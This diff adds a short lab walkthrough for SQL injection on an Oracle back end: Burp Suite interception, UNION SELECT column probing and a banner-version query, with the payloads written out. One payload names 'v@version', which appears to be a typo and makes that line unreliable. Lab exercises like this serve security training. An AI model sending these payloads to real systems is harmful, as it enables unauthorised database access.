@@ -1,0 +1,19 @@
+                 
+
+
+
+                        LAB #6  SQL injection attack, querying the database type and version on Oracle
+
+                        1. Configure your browser with proxy tool such as Burp Suite
+                        2. Turn on the intercept in Burp Suite
+                        3. In the Browser click on corporate gifts 
+                        4. Send the intercepted request to Repeater
+                        5. In the request change the category=' and observe the response 
+                           it's 500 Internal server error, it suggest that there is sql injection vulnerability.
+                        6. Now check for how many columns the table has for this 
+                           change the category=' to category='+UNION+SELECT+NULL+FROM+dual--
+                           it's still giving 500 internal server error in the response.
+                        7. Now again change the payload category='+UNION+SELECT+NULL,+NULL+FROM+dual--
+                           it's giving 200 OK which suggest that table has two columns.
+                        8. Now replace the query and add category='+UNION+SELECT+BANNER,+NULL+FROM+v@version--
+                        9. Observe the response the table responded with it's version.
